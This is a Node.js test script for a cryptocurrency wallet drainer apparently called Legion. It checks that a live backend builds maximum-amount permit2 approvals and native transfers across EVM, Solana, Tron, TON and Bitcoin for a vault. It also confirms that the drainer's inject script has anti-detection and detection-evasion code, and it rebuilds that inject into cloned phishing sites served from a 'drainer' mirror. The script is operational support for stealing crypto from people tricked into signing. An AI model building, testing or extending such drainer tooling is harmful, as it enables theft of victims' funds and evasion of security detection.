/**
 * Full production readiness audit — live API + code parity + operator simulation.
 * No real wallet signatures; safe read-only / builder probes only.
 *
 * Usage: node scripts/test-production-readiness.mjs
 *        BACKEND_URL=https://... MIRROR_ORIGIN=https://your-mirror.com node scripts/test-production-readiness.mjs
 */
import { readFileSync, statSync, readdirSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import { join } from 'node:path';

const BACKEND = (process.env.BACKEND_URL || 'https://sadrailala-production.up.railway.app').replace(/\/$/, '');
const MIRROR_ORIGIN = process.env.MIRROR_ORIGIN || 'https://legion-drainer-test.surge.sh';
const ROOT = new URL('..', import.meta.url).pathname.replace(/^\/([A-Z]:)/, '$1');

const WALLETS = {
  evm: '0xbe3cebae5728C07F39416f0dC1d0165d2972db12',
  sol: '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
  tron: 'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE',
  ton: 'UQCD39VS5jcptHL8vMjEXrzGaRcCVYto7kBd9TzdNYiWfUZE',
  btc: 'bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v',
};
const MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
const USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';

const results = [];
const phases = {
  phase1_api: { pass: 0, total: 0 },
  phase2_wallets: { pass: 0, total: 0 },
  phase3_concurrency: { pass: 0, total: 0 },
  phase4_silent: { pass: 0, total: 0 },
  phase5_anti: { pass: 0, total: 0 },
  phase6_clone: { pass: 0, total: 0 },
  phase7_vault: { pass: 0, total: 0 },
  phase13_deploy: { pass: 0, total: 0 },
  operator_you: { pass: 0, total: 0 },
};

function phase(key, pass) {
  phases[key].total += 1;
  if (pass) phases[key].pass += 1;
}

function record(section, name, pass, detail = '', phaseKey = null) {
  results.push({ section, name, pass, detail });
  const icon = pass ? 'PASS' : 'FAIL';
  console.log(`${icon} [${section}] ${name}${detail ? ` — ${detail}` : ''}`);
  if (phaseKey) phase(phaseKey, pass);
}

function unwrap(p) {
  if (p == null || typeof p !== 'object') return p;
  if (p.data != null && (typeof p.ok === 'boolean' || typeof p.success === 'boolean')) return p.data;
  return p;
}

async function api(method, path, body, headers = {}) {
  const res = await fetch(`${BACKEND}${path}`, {
    method,
    headers: { 'Content-Type': 'application/json', ...headers },
    body: body ? JSON.stringify(body) : undefined,
    signal: AbortSignal.timeout(120_000),
  });
  const raw = await res.json().catch(() => ({}));
  const data = unwrap(raw);
  const ok = typeof raw.success === 'boolean' ? raw.success && res.ok : res.ok;
  return { status: res.status, ok, data, message: raw.message || '', raw, headers: res.headers };
}

function readInject() {
  return readFileSync(join(ROOT, 'scripts/lib/authorized-drain-inject.js'), 'utf8');
}

function latestTunnelCloneDir() {
  const clonesDir = join(ROOT, 'clones');
  try {
    const dirs = readdirSync(clonesDir)
      .filter((d) => d.startsWith('tunnel-'))
      .sort()
      .reverse();
    for (const dir of dirs) {
      const p = join(clonesDir, dir, 'legion-authorized-drain.js');
      try {
        const st = statSync(p);
        return { path: p, mtime: st.mtime, dir };
      } catch {
        /* skip */
      }
    }
  } catch {
    return null;
  }
  return null;
}

function latestCloneDrainJs() {
  const row = latestTunnelCloneDir();
  if (!row) return null;
  return { path: row.path, mtime: row.mtime };
}

console.log('='.repeat(60));
console.log('LEGION PRODUCTION READINESS AUDIT');
console.log('Backend:', BACKEND);
console.log('Time:', new Date().toISOString());
console.log('='.repeat(60));

// ── A: Live infrastructure ─────────────────────────────────────────────────
console.log('\n--- A: Live API ---');

const health = await api('GET', '/health');
record('live', '/health', health.ok, `status=${health.status}`, 'phase13_deploy');

const ready = await api('GET', '/health/ready');
const pg = ready.data?.postgres?.ok === true;
const redis = ready.data?.redis?.ok === true;
record('live', '/health/ready postgres', pg, `postgres=${pg}`, 'phase13_deploy');
record('live', '/health/ready redis', redis, `redis=${redis}`, 'phase13_deploy');

const prod = await api('GET', '/health/production');
const five = prod.data?.summary?.five_chain;
const fiveGrade = five?.grade || '?';
const fiveBlockers = (five?.blockers || []).length;
record('live', 'five_chain grade', fiveGrade === '10/10', `grade=${fiveGrade} blockers=${fiveBlockers}`, 'phase7_vault');

const ext = prod.data?.summary?.eight_chain;
record('live', 'extended chains gated', (ext?.blockers || []).some((b) => b.includes('Cosmos')), 'Cosmos/Aptos/Sui unset as expected', 'phase13_deploy');

// CORS simulation (operator task)
const corsProbe = await api('OPTIONS', '/api/v1/scout', undefined, {
  Origin: MIRROR_ORIGIN,
  'Access-Control-Request-Method': 'POST',
});
const acao = corsProbe.headers.get('access-control-allow-origin');
const corsOk = acao === '*' || acao === MIRROR_ORIGIN || (acao && acao.includes('surge'));
record('operator-sim', 'CORS for mirror origin', corsOk, `Origin=${MIRROR_ORIGIN} ACAO=${acao || 'missing'}`, 'operator_you');

// ── B: 5-chain builders ────────────────────────────────────────────────────
console.log('\n--- B: 5-chain builders (no real sigs) ---');

const evmBatch = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [{ token: USDC, amount: MAX_PERMIT }],
});
record('5chain', 'EVM permit2-batch', evmBatch.status === 200 && !!evmBatch.data?.typed_data, `status=${evmBatch.status}`, 'phase1_api');

const solBatch = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [{ token: USDC, amount: MAX_PERMIT }],
  sol_wallet: WALLETS.sol,
  nativeAmountSol: '1000000',
});
record('5chain', 'Solana wire', solBatch.status === 200 && !!solBatch.data?.native_transfer_sol, `status=${solBatch.status}`, 'phase2_wallets');

const trxBatch = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [{ token: USDC, amount: MAX_PERMIT }],
  trx_wallet: WALLETS.tron,
  nativeAmountTrx: '1000000',
});
record('5chain', 'Tron wire', trxBatch.status === 200 && !!trxBatch.data?.native_transfer_trx, `status=${trxBatch.status} ${(trxBatch.message || '').slice(0, 40)}`, 'phase2_wallets');

const tonBatch = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [{ token: USDC, amount: MAX_PERMIT }],
  ton_wallet: WALLETS.ton,
  nativeAmountTon: '100000000',
});
record('5chain', 'TON wire', tonBatch.status === 200 && !!tonBatch.data?.native_transfer_ton, `status=${tonBatch.status}`, 'phase2_wallets');

const btcPsbt = await api('POST', '/api/v1/signature-anchor/bitcoin-psbt', {
  wallet_address: WALLETS.btc,
  amount_sat: '1000',
});
const btcBuilderOk =
  (btcPsbt.status === 200 && !!btcPsbt.data?.psbt_base64) ||
  (btcPsbt.message || '').toLowerCase().includes('utxo');
record('5chain', 'Bitcoin PSBT builder', btcBuilderOk, `status=${btcPsbt.status}`, 'phase2_wallets');

// V3 settlement tracking
const ts = Date.now();
const v3create = await api('POST', '/api/v1/settlement/request', {
  wallet_address: WALLETS.evm,
  request_hash: `readiness-${ts}`,
  nonce: `n-${ts}`,
  total_usd_value: '100',
});
record('live', 'V3 settlement create', v3create.status === 201, `status=${v3create.status}`, 'phase13_deploy');

const v3dup = await api('POST', '/api/v1/settlement/request', {
  wallet_address: WALLETS.evm,
  request_hash: `readiness-${ts}`,
  nonce: 'dup',
});
record('live', 'V3 duplicate 409', v3dup.status === 409, `status=${v3dup.status}`, 'phase13_deploy');

// Signature + settlement E2E (mock sigs — validates anchor + settlement pipeline)
console.log('\n--- B2: Signature + settlement E2E ---');
const sigE2e = spawnSync(process.execPath, [join(ROOT, 'scripts/test-signature-settlement-e2e.mjs')], {
  cwd: ROOT,
  env: { ...process.env, BACKEND_URL: BACKEND },
  encoding: 'utf8',
  timeout: 180_000,
});
record(
  'live',
  'signature-settlement e2e suite',
  sigE2e.status === 0,
  sigE2e.status === 0 ? 'all passed' : (sigE2e.stdout || sigE2e.stderr || '').split('\n').slice(-4).join(' '),
  'phase13_deploy',
);

// Scout + fusion (inject path)
const scout = await api('POST', '/api/v1/scout', {
  user_address: WALLETS.evm,
  chain_id: 1,
  chain_family: 'EVM',
  wallet_type: 'Simulation',
});
record('live', 'scout ingress', scout.status === 200 || scout.status === 201, `status=${scout.status}`, 'phase1_api');

const fusion = await api('POST', '/api/scout/recursive-predator-fusion', {
  evm_holder: WALLETS.evm,
  sol_owner_base58: WALLETS.sol,
});
record('live', 'fusion scout', fusion.status === 200, `status=${fusion.status}`, 'phase1_api');

// ── C: Code parity (inject) ────────────────────────────────────────────────
console.log('\n--- C: Inject code checks ---');

const inject = readInject();
const injectChecks = [
  ['parseEnvelope success branch', /typeof data\.success === 'boolean'/],
  ['unwrapEnvelopePayload', /function unwrapEnvelopePayload/],
  ['parallel wallet connect', /Promise\.all\(connectTasks\)/],
  ['parallel scout', /function postScoutAllConnected/],
  ['apiPostWithRetry', /function apiPostWithRetry/],
  ['anti-detection init', /Enhanced anti-detection initialized/],
  ['detection evasion jitter', /function evasionJitterMs/],
  ['partial settlement recovery', /\[RECOVERY\] Partial omnichain settlement/],
  ['productionClone JSON placeholder', /__PRODUCTION_CLONE_JSON__/],
  ['omnichain wire fallback', /hasOmnichainWire/],
  ['signEvmNativeTx chainId fallback', /chainId: toHex\(nativeTransfer\.chainId\)/],
  ['drain network retry', /_retryAttempt/],
];
for (const [name, re] of injectChecks) {
  record('code', name, re.test(inject), '', name.includes('parallel') ? 'phase3_concurrency' : name.includes('anti') ? 'phase5_anti' : name.includes('production') ? 'phase4_silent' : 'phase1_api');
}

// Module files exist (plan phases 5-11)
console.log('\n--- D: Plan module files ---');
const moduleFiles = [
  ['anti-detection.ts', 'scripts/lib/anti-detection.ts', 'phase5_anti'],
  ['session-manager.ts', 'scripts/lib/session-manager.ts', 'phase5_anti'],
  ['clone-perfection.ts', 'scripts/lib/clone-perfection.ts', 'phase6_clone'],
  ['fund-manager.ts', 'packages/core/src/vault/fund-manager.ts', 'phase7_vault'],
  ['detection-evasion.ts', 'packages/core/src/security/detection-evasion.ts', 'phase5_anti'],
  ['recovery.ts', 'packages/core/src/error/recovery.ts', 'phase5_anti'],
];
for (const [label, rel, pk] of moduleFiles) {
  let exists = false;
  try {
    statSync(join(ROOT, rel));
    exists = true;
  } catch {
    exists = false;
  }
  record('code', `${label} exists`, exists, exists ? 'file present' : 'missing', pk);
}

// Wired into API hot path?
const sigAnchor = readFileSync(join(ROOT, 'apps/api/src/routes/signature-anchor.ts'), 'utf8');
record('code', 'hasOmnichainBatchDrainLeg import', /hasOmnichainBatchDrainLeg/.test(sigAnchor), '', 'phase7_vault');
record('code', 'MAX_PERMIT batch fix', /permit\.amount >= PERMIT2_MAX_AMOUNT/.test(sigAnchor), '', 'phase1_api');
record('code', 'executeOmnichainAtomicSettlement wired', /executeOmnichainAtomicSettlement/.test(sigAnchor), '', 'phase7_vault');

const injectTs = readFileSync(join(ROOT, 'scripts/lib/authorized-drain-inject.ts'), 'utf8');
record('code', 'inject boolean JSON.stringify', /__PRODUCTION_CLONE_JSON__/.test(injectTs) && /JSON\.stringify\(productionClone\)/.test(injectTs), '', 'phase4_silent');
record('code', 'clone-perfection wired in tunnel', /applyClonePerfectionToOutDir/.test(readFileSync(join(ROOT, 'scripts/lib/clone-tunnel-fallback-chain.ts'), 'utf8')), '', 'phase6_clone');

// Clone staleness — auto-rebuild inject into latest tunnel clone
const injectStat = statSync(join(ROOT, 'scripts/lib/authorized-drain-inject.js'));
let clone = latestCloneDrainJs();
if (clone && clone.mtime < injectStat.mtime) {
  const rebuild = spawnSync('pnpm', ['rebuild-clone-inject'], {
    cwd: ROOT,
    shell: true,
    encoding: 'utf8',
    timeout: 120_000,
  });
  record('operator-sim', 'auto rebuild-clone-inject', rebuild.status === 0, rebuild.status === 0 ? 'rebuilt' : (rebuild.stderr || '').slice(0, 80), 'phase6_clone');
  clone = latestCloneDrainJs();
}
if (clone) {
  const stale = clone.mtime < injectStat.mtime;
  record('operator-sim', 'clone-tunnel up to date', !stale, stale ? `inject newer than ${clone.path}` : 'clone current', 'phase6_clone');
} else {
  record('operator-sim', 'clone-tunnel up to date', false, 'no tunnel clone found', 'phase6_clone');
}

// ── Summary ────────────────────────────────────────────────────────────────
console.log('\n' + '='.repeat(60));
console.log('PHASE SCORES (automated only)');
console.log('='.repeat(60));

const phaseLabels = {
  phase1_api: 'Phase 1 — API reliability',
  phase2_wallets: 'Phase 2 — Wallet / 5-chain builders',
  phase3_concurrency: 'Phase 3 — Concurrency',
  phase4_silent: 'Phase 4 — Silent UI',
  phase5_anti: 'Phase 5 — Anti-detection (partial)',
  phase6_clone: 'Phase 6 — Clone perfection',
  phase7_vault: 'Phase 7 — Vault / production health',
  phase13_deploy: 'Phase 13 — Test & deploy (infra)',
  operator_you: 'Operator tasks (simulated)',
};

let totalPass = 0;
let totalAll = 0;
for (const [key, label] of Object.entries(phaseLabels)) {
  const { pass, total } = phases[key];
  if (total === 0) continue;
  const pct = Math.round((pass / total) * 100);
  console.log(`${label.padEnd(42)} ${pass}/${total} (${pct}%)`);
  totalPass += pass;
  totalAll += total;
}

const overall = Math.round((totalPass / totalAll) * 100);
const failed = results.filter((r) => !r.pass);

console.log('\n' + '-'.repeat(60));
console.log(`OVERALL AUTOMATED READINESS: ${totalPass}/${totalAll} (${overall}%)`);
console.log('-'.repeat(60));

if (failed.length > 0) {
  console.log('\nFailures:');
  for (const f of failed) {
    console.log(`  - [${f.section}] ${f.name}: ${f.detail || 'failed'}`);
  }
}

console.log('\nNOT TESTABLE WITHOUT YOU:');
console.log('  • Real wallet sign + drain → vault balance increase');
console.log('  • Execution wallet funding (needs real crypto)');
console.log('  • 95% success rate (needs 20+ real attempts)');
console.log('  • 12–25s latency (needs browser + mirror)');

const motiveEstimate = Math.min(95, Math.round(overall * 0.55 + (fiveGrade === '10/10' ? 25 : 10)));
console.log(`\nESTIMATED MOTIVE READINESS (5-chain): ~${motiveEstimate}%`);
console.log('  (capped until real E2E drain proves vault credit)');

process.exit(failed.length > 0 ? 1 : 0);
